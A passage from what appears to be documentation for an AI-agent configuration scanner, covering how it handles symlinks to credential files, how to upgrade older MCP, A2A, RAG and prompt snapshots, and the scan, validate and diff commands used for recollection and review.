file, an import or a file of a skill or command directory is a symlink to it, whatever
that file is named; and when a rule, prompt, subagent, skill or command directory holds
it, while the directory's other files are inventoried as usual. A symlink replaced
between that check and the read, so that the read follows it to such a file, is a
collection failure, and nothing read is kept. A symlink to any other in-root file, such
as `CLAUDE.md` to `AGENTS.md`, is read through its target.

The `model` collector applies the same rule to a model directory's configuration,
tokenizer and chat template files: one whose name, or the name of the in-root file a
symlink there leads to, says it holds credentials, such as `config.json` linked to
`../.env`, is a coverage gap that names it, and no `config_files`, `tokenizer_files`
or chat template digest covers it.

## Upgrade existing snapshots

Older static MCP snapshots lack the source binding and configured tool locators,
and older A2A snapshots lack the structure digests or carry the superseded
`nexus-symbiote/a2a-card-structure/v1`, `v2` or `v3` profile; older RAG records carry no
structure digest or the superseded `nexus-symbiote/rag-source-structure/v1` profile,
and older IDE agent records no keyed settings binding and no
`settings_hashes_profile`. Prompt records from earlier builds carry a
`content_hash` for files this build inventories without one: an `@path` import of a
file without a Markdown suffix, such as `@prompts/system.txt`, a recorded instruction
file that is a symlink to such a file, and a rule, prompt or subagent file whose name
has a suffix other than a Markdown one, such as `.clinerules/style.txt`. Against such a
baseline, `diff --fail-on-alert` raises a one-time high `Content hash removed` alert on
each of them, and `validate --project` reports `project-reconciliation-failed`, with or
without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`; without the key, each of them also raises
the medium alert for unbound values on every comparison. They cannot establish this
stronger reconciliation contract. Missing or unknown binding profiles fail
validation and require recollection; copying a newly calculated digest into an
old approved snapshot is not a migration.

The v4 A2A card profile refuses ambiguous redacted scheme identifiers. Recollect,
review and reapprove v3 card baselines even if the card has ordinary names; do not
copy a new digest into an old approval. A2A client and keyed whole-card profiles
are unchanged.

```sh
nexus-symbiote scan /path/to/project --no-project-policy --report-only -o candidate.json
nexus-symbiote validate candidate.json --no-project-policy --project /path/to/project
nexus-symbiote diff reviewed.json candidate.json --json-output --fail-on-alert
```

`--report-only` allows collection of a candidate despite policy findings. It does
not approve that candidate. Review the diff and coverage, resolve failed or
unknown checks, and independently authenticate any replacement approval.

Static configuration and served descriptors are separate observation scopes.
Live candidates whose served descriptors differ from the declaration need their
own authenticated review; passing one scope does not establish the other.

The regression cases in `tests/test_mcp_source_binding.py` cover changed source,
edited supplied descriptors, missing legacy evidence, redaction, canonical
object-key ordering and project resolver settings, and hold the known-answer vectors
for the v3 structure digest and the v2 keyed binding. These cases test the stated contract, not detection efficacy
across an independently sampled population of agent deployments.
